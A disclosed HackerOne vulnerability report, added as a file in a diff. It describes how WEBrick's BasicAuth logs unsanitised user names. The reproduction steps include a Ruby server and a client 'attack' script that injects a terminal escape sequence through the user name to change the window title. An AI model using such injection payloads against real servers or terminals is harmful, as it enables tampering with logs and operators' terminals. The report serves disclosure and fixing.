@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/223363
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/mame
+ReportedTo:Ruby(ruby)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:15.09.2017 5:29:39
+
+Summary:
+
+WEBrick BasicAuth outputs any non-existing user name to logs without sanitizing.  By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as [the old already-fixed vulnerability](https://www.ruby-lang.org/en/news/2010/01/10/webrick-escape-sequence-injection/).
+
+How to reproduce:
+
+1) Run this WEBrick server program in a terminal.
+
+~~~~
+require "webrick"
+require "webrick/httpauth"
+
+srv = WEBrick::HTTPServer.new({ Port: 34567 })
+db = WEBrick::HTTPAuth::Htpasswd.new("dot.htpasswd")
+authenticator = WEBrick::HTTPAuth::BasicAuth.new(UserDB: db, Realm: "realm")
+srv.mount_proc("/") do |req, res|
+  authenticator.authenticate(req, res)
+  res.body = "foobar"
+end
+srv.start
+~~~~
+
+2) Run this attack access program in another terminal.
+
+~~~~
+require "open-uri"
+
+open("http://localhost:34567/login",
+  http_basic_authentication: [
+      "ESCAPE SEQUENCE HERE->\e]2;BOOM!\a<-SEE WINDOW TITLE",
+      "passwd"
+]).read
+~~~~
+
+3) See the first terminal that runs the server.  You will see a line like this, and its window title changed "BOOM!".
+
+~~~~
+[2017-04-24 19:23:46] ERROR Basic realm: ESCAPE SEQUENCE HERE-><-SEE WINDOW TITLE: the user is not allowed.
+~~~~
+
+Note: I'm a member of the ruby-core team, but I'm not involved with development of WEBrick.  I did not create the bug, of course.  I will happily accept any bounty if any :-)
